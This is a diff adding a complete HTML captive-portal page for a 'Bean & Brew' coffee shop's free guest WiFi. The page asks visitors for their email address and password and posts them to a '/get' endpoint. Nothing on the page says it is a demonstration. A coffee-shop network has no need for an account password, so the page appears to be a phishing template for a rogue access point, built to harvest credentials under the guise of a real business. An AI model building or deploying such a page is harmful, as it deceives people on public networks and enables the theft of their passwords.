@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bean & Brew - Free WiFi</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #3c1810 0%, #6b3a2a 50%, #8b5e3c 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 40px 32px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo-icon {
+      font-size: 48px;
+      margin-bottom: 8px;
+    }
+    .logo h1 {
+      font-size: 22px;
+      color: #3c1810;
+      font-weight: 700;
+    }
+    .logo p {
+      color: #8b7355;
+      font-size: 13px;
+      margin-top: 4px;
+    }
+    .divider {
+      height: 1px;
+      background: #e8e0d8;
+      margin: 20px 0;
+    }
+    .info {
+      background: #faf6f0;
+      border-radius: 10px;
+      padding: 14px 16px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #6b5a48;
+      line-height: 1.5;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #4a3728;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 2px solid #e8e0d8;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-bottom: 16px;
+      font-family: inherit;
+    }
+    input:focus { border-color: #8b5e3c; }
+    input::placeholder { color: #c4b8a8; }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #6b3a2a, #8b5e3c);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      font-family: inherit;
+    }
+    button:hover { opacity: 0.9; }
+    .terms {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 11px;
+      color: #a89880;
+      line-height: 1.5;
+    }
+    .terms a { color: #6b3a2a; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="logo-icon">&#9749;</div>
+      <h1>Bean &amp; Brew</h1>
+      <p>Complimentary Guest WiFi</p>
+    </div>
+    <div class="divider"></div>
+    <div class="info">
+      Welcome! Sign in with your email to enjoy free WiFi while you sip your favorite brew.
+    </div>
+    <form method="POST" action="/get">
+      <label for="email">Email Address</label>
+      <input id="email" name="email" type="text" placeholder="you@example.com" required>
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit">Connect to WiFi</button>
+    </form>
+    <p class="terms">
+      By connecting, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+    </p>
+  </div>
+</body>
+</html>
